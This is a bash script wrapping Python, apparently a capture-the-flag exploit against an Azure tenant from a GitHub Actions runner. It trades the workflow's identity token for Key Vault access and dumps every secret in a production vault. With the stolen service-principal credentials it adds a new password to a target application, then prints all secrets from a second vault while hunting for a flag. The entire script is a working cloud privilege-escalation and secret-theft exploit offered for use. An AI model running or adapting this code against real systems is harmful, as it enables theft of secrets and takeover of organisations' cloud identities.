#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, time, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None:
        body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
G="https://graph.microsoft.com/v1.0"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def tok(c, scope):
    st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":scope,"grant_type":"client_credentials"})
    return jg(b).get("access_token")

AUD=tok(creds["directory-audit-principal"], "https://graph.microsoft.com/.default")
SYN=tok(creds["sync-service-principal"],   "https://graph.microsoft.com/.default")
HA={"Authorization":"Bearer "+AUD}; HS={"Authorization":"Bearer "+SYN}

TARGET_SP="63e87ab1-6bd2-4e80-92be-943450b20e4f"
st,b=http(f"{G}/servicePrincipals/{TARGET_SP}?$select=id,displayName,appId,servicePrincipalType", headers=HA)
tsp=jg(b)
print("### target SP on kv-tbl-sec:", st, json.dumps(tsp)[:300])
APPID=tsp.get("appId")
if not APPID:
    print("cannot resolve target appId"); raise SystemExit(0)

st,b=http(f"{G}/applications?$filter=appId eq '{APPID}'&$select=id,displayName,appId", headers=HS)
apps=jg(b).get("value",[])
print("### application object:", st, json.dumps(apps)[:300])
if not apps:
    print("no application object visible"); raise SystemExit(0)
AOID=apps[0]["id"]

kid=None
try:
    st,b=http(f"{G}/applications/{AOID}/addPassword", headers=HS, method="POST",
              js={"passwordCredential":{"displayName":"ci-temp"}})
    print("### addPassword:", st)
    if st not in (200,201):
        print("   ", b[:300]); raise SystemExit(0)
    pc=jg(b); kid=pc["keyId"]; SECRET=pc["secretText"]
    print("   credential added, keyId:", kid)

    flag=None
    for attempt in range(12):
        time.sleep(10)
        t=tok({"appId":APPID,"clientSecret":SECRET,"tenantId":TEN}, "https://vault.azure.net/.default")
        if not t:
            print(f"   [{attempt}] token not ready"); continue
        st,b=http("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",
                  headers={"Authorization":"Bearer "+t})
        print(f"   [{attempt}] kv-tbl-sec list HTTP {st}")
        if st!=200:
            print("      ", b[:160]); continue
        for s in jg(b).get("value",[]):
            nm=s["id"].rsplit("/",1)[-1]
            st2,b2=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+t})
            v=jg(b2).get("value","")
            print(f"      SECRET {nm} = {v}")
            if "{" in v: flag=v
        break
    print("\n>>> FLAG:", flag)
finally:
    if kid:
        st,b=http(f"{G}/applications/{AOID}/removePassword", headers=HS, method="POST", js={"keyId":kid})
        print("### cleanup removePassword:", st)
PYEOF
echo "=== done ==="